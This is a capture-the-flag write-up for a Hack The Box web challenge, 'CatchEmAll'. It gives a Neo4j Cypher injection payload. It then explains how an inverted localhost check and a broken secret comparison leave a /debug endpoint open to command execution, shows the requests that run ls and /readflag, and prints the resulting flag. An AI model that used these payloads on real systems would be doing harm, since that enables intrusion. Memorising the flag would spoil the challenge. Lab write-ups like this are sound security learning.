---
title: CatchEmAll
tags:
  - web
---
### Challenge Description

>Your one-stop resource to find which city you can find your favorite pokemon to catch on! Go catch 'em all! Note: The remote instance might take a few minutes to spawn. Please be patient.

File provided: web_catchemall.zip

### Solution

The web application is vulnerable to Neo4j Cypher injection. Example POST request:  

```
POST /api/catch HTTP/1.1

{"pokemon":"Pikachu\" CALL db.labels() YIELD label RETURN label AS destination, 'info' AS catch_type LIMIT 5 //"}
```

I'm not sure if that bug would have been an alternative path to get the flag. I found another bug by checking the source code provided. `challenge/routes/index.js` has a logic bugs that makes /debug open to anyone and allows arbitrary command execution:

* `isLocalhost` check is inverted, so non localhost traffic is allowed while localhost is blocked.
- The secret check is broken: `if (! secret === process.env.DEBUG_SECRET )` is always false, so no secret is required.

This provides with command execution when calling /debug with the cmd parameter. For example, the following will execute an ls command:

`GET /debug?cmd=ls%20/&secret=x%22 HTTP/1.1`

The server response is:

`{"cmd":"ls /","output":"app\nbin\nboot\ndev\nentrypoint.sh\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nreadflag\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n"}`

We can see a file called `readflag`. I tried to read it with cat but the file is a binary, so let's simply try executing it:

`GET /debug?cmd=/readflag&secret=x%22 HTTP/1.1`

Server response:

`{"cmd":"/readflag","output":"HTB{0n3_1nj3c710n_t0_c4tch_3m_4ll!_f45e230e430acd915016c129f238bd3f}"}`

Flag: `HTB{0n3_1nj3c710n_t0_c4tch_3m_4ll!_f45e230e430acd915016c129f238bd3f}`
